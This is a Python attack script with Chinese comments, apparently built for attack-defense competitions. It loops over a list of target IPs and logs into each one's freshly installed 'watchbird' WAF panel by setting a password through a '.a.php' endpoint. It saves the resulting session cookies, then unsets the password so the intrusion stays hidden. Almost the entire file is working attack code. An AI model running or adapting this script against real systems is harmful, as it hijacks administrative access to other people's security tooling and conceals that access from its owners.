import requests
import time

'''
在别人安装waf后立即登录保存cookie,然后重置密码隐藏行为
'''

php = '.a.php'#修改为能上waf的文件

def reset_all_password():
    """读取success_cookie.txt，批量重置密码"""
    targets = []
    try:
        with open('./success_cookie.txt', 'r', encoding='utf-8') as f:
            lines = f.readlines()
            current_ip = None
            current_cookie = None
            for line in lines:
                line = line.strip()
                if line.startswith("IP: "):
                    current_ip = line.replace("IP: ", "")
                elif line.startswith("Cookie: "):
                    cookie_str = line.replace("Cookie: ", "")
                    current_cookie = eval(cookie_str)
                elif line.startswith("-" * 50):
                    if current_ip and current_cookie:
                        targets.append({
                            "ip": current_ip,
                            "cookie": current_cookie
                        })
                    current_ip = None
                    current_cookie = None
    except FileNotFoundError:
        print("[重置模块] 暂无cookie文件，跳过重置")
        return

    if not targets:
        print("[重置模块] 暂无有效目标，跳过重置")
        return

    print("\n========== 开始批量重置密码 ==========")
    for item in targets:
        ip_addr = item["ip"]
        cookie = item["cookie"]
        try:
            url = ip_addr + php + '?watchbird=change&key=password_sha1&value=unset'
            resp = requests.get(url=url, cookies=cookie, timeout=5)
            print("-" * 60)
            print(f"重置目标IP：{ip_addr}")
            print(f"接口返回：{resp.text}")
        except Exception as e:
            print("-" * 60)
            print(f"[{ip_addr}] 重置密码请求出错：{str(e)}")
    print("========== 本轮重置完成 ==========\n")


def scan_task():
    all_ip = []
    success_result = []
    # 读取ip.txt
    try:
        with open('../攻击主机/ip.txt', 'r', encoding='utf-8') as file:
            for raw_line in file:
                ip_addr = raw_line.strip()
                if ip_addr:
                    all_ip.append(ip_addr)
    except FileNotFoundError:
        print("未找到ip.txt，等待5秒重试...")
        time.sleep(5)
        return

    if not all_ip:
        print("ip.txt为空，等待5秒重新加载...")
        time.sleep(5)
        return

    # 遍历扫描每个IP拿cookie
    for target_ip in all_ip:
        try:
            url = target_ip + php + '?watchbird=ui&passwd=HLdf@2731'
            resp1 = requests.get(url=url, timeout=5)
            print(f"[{target_ip}] 设置密码返回：{resp1.text}")

            resp2 = requests.get(url=url, timeout=5)
            print(f"[{target_ip}] 获取Cookie：{resp2.cookies}")

            success_result.append({
                "ip": target_ip,
                "cookie": dict(resp2.cookies)
            })
        except Exception as err:
            print(f"[{target_ip}] 访问失败：{str(err)}")

    # 追加保存成功cookie
    with open('./success_cookie.txt', 'a', encoding='utf-8') as f:
        for item in success_result:
            f.write(f"IP: {item['ip']}\nCookie: {item['cookie']}\n" + "-" * 50 + "\n")

    # 剔除成功IP，重写回ip.txt
    success_ip_set = {x["ip"] for x in success_result}
    fail_ip_list = [ip for ip in all_ip if ip not in success_ip_set]
    with open('../攻击主机/ip.txt', 'w', encoding='utf-8') as f:
        for ip in fail_ip_list:
            f.write(ip + "\n")

    print("=" * 40)
    print(f"本轮扫描成功数量：{len(success_result)}")
    print(f"剩余待扫描IP：{len(fail_ip_list)}")

    # 扫描完成后执行重置密码函数
    reset_all_password()

    print("本轮全部流程结束，休息2秒进入下一轮循环\n")
    time.sleep(2)


# 无限死循环
if __name__ == "__main__":
    while True:
        scan_task()



